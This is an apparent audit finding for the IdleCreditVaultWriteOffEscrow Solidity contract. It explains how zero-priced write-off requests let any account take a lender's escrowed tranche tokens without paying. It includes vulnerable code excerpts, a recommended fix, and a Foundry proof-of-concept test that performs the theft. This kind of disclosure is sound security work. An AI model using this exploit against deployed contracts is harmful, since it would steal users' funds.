### Title
Zero-priced write-off requests allow theft of escrowed tranche tokens - (File: `contracts/IdleCreditVaultWriteOffEscrow.sol`)

### Summary
`createWriteOffRequest` rejects zero deposited tranches but accepts `underlyingsRequested == 0`. This records a sell order asking for no underlying payment while custodying the lender’s tranche tokens. `fullfillWriteOffRequest` then treats zero as a valid fulfillment amount because it only rejects underpayment relative to the stored request. Any EOA can therefore claim the entire escrowed tranche position for free.

### Finding Description
A lender creates a write-off request by transferring `amount` tranche tokens to the escrow. The function validates only `amount == 0` and stores `underlyingsRequested` without requiring it to be nonzero. [1](#0-0) 

During fulfillment, the contract requires `_tranches` to equal the stored tranche amount and requires only `_underlyings >= currentRequest.underlyings`. For a zero-priced request, passing `_underlyings == 0` satisfies the check. The escrow then deletes the request, performs zero-value underlying transfers, and transfers the full escrowed tranche balance to the fulfiller. [2](#0-1) 

The broken invariant is **one escrowed receipt, one adequate payout**: the contract treats an empty price as a valid exchange price rather than rejecting the malformed order.

### Impact Explanation
An unprivileged fulfiller can steal every tranche token held by a zero-priced request without paying underlying tokens.

For a request containing `T` tranche tokens and a tranche redemption price of `p` underlying units per tranche token, the victim loses approximately `T * p / 1e18` underlying value and the attacker receives `T` tranche tokens. The escrowed tokens are not burned and are not protected by the request’s pending-underlying accounting because `pendingUnderlyings` remains zero.

This impact is limited to requests whose owner submitted `underlyingsRequested == 0`; requests with a positive price cannot be settled for free.

### Likelihood Explanation
Likelihood is medium:

- A lender only needs to submit a malformed zero-priced request once.
- Such a request can result from a UI omission, unit-decimal conversion error, omitted argument, or integration bug.
- No privileged role is required to exploit it; any EOA can call `fullfillWriteOffRequest`.
- Requests are discoverable through public transactions/events and the public `userRequests` mapping.
- Requests can only be created while the epoch is running, which bounds the time in which new vulnerable requests can enter the escrow.

### Recommendation
Reject zero-priced requests in `createWriteOffRequest`:

```solidity
if (amount == 0 || underlyingsRequested == 0) revert NotAllowed();
```

Optionally add a defense-in-depth check in `fullfillWriteOffRequest` that the stored request has nonzero `underlyings`. Users who no longer want to sell should use `deleteWriteOffRequest` rather than recording a free order.

### Proof of Concept
Add this test to the existing `IdleCreditVaultWriteOffEscrow` Foundry fixture, where `LP` owns tranche tokens and has already approved the escrow:

```solidity
function testZeroAskWriteOffRequestCanBeEmptiedForFree() external {
    address thief = makeAddr("zero-ask-thief");
    uint256 trancheAmount = 10_000e18;

    // Victim accidentally creates a request asking for zero underlying.
    vm.prank(LP);
    escrow.createWriteOffRequest(trancheAmount, 0);

    (uint256 escrowedTranches, uint256 askedUnderlyings) =
        escrow.userRequests(LP);
    assertEq(escrowedTranches, trancheAmount);
    assertEq(askedUnderlyings, 0);
    assertEq(tranche.balanceOf(address(escrow)), trancheAmount);

    uint256 lpUnderlyingBefore = underlying.balanceOf(LP);
    uint256 thiefTrancheBefore = tranche.balanceOf(thief);

    // Any unprivileged account fulfills the request without approving or
    // paying underlying, and receives the escrowed tranche tokens.
    vm.prank(thief);
    escrow.fullfillWriteOffRequest(LP, trancheAmount, 0);

    (escrowedTranches, askedUnderlyings) = escrow.userRequests(LP);
    assertEq(escrowedTranches, 0);
    assertEq(askedUnderlyings, 0);
    assertEq(tranche.balanceOf(address(escrow)), 0);
    assertEq(tranche.balanceOf(thief), thiefTrancheBefore + trancheAmount);
    assertEq(underlying.balanceOf(LP), lpUnderlyingBefore);
}
```

```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

```text
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```
